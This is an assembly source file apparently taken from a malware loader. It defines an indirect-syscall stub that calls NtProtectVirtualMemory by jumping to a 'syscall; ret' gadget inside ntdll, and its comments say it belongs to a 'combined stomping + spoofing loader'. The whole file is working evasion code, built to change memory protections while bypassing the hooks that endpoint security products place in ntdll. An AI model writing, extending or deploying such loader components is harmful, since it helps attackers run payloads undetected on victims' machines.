; asm.asm - Indirect Syscall stub for NtProtectVirtualMemory
; Used by the combined stomping + spoofing loader
; Jumps to 'syscall; ret' instruction inside ntdll.dll

section .text

global NtProtectVirtualMemory_Indirect

; void NtProtectVirtualMemory_Indirect(
;     HANDLE ProcessHandle,     // rcx
;     PVOID* BaseAddress,       // rdx
;     PSIZE_T RegionSize,       // r8
;     ULONG NewProtect,         // r9
;     PULONG OldProtect,        // [rsp+0x28]
;     PVOID SyscallGadget       // [rsp+0x30]
; );

NtProtectVirtualMemory_Indirect:
    mov r10, rcx                    ; Standard Nt* calling convention
    mov eax, 0x50                   ; SSN for NtProtectVirtualMemory (Win10/11)
    mov r11, [rsp + 0x30]           ; SyscallGadget = address of 'syscall; ret' in ntdll
    jmp r11                         ; Execute syscall from within ntdll
